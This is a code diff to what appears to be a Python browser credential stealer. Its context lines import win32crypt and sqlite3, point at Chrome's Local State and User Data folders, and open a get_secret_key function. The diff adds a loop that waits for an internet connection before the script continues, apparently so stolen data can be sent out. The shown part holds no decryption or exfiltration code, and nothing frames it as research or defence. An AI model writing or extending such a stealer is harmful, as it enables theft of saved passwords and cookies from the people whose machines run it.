@@ -2,6 +2,7 @@ import os
 import re
 import sys
 import json
+import time
 import base64
 import sqlite3
 import win32crypt
@@ -17,6 +18,17 @@ tmpfile = os.path.join(tmpdir,'text.txt')
 temp_file = open(tmpfile,'w')
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+
+def wait_for_internet(url="http://www.google.com", timeout=5, sleep_duration=5):
+    while True:
+        try:
+            response = requests.get(url, timeout=timeout)
+            if response.status_code == 200:
+                return True
+        except requests.RequestException:
+            time.sleep(5)
+
+wait_for_internet()
 
 def get_secret_key():
     try:
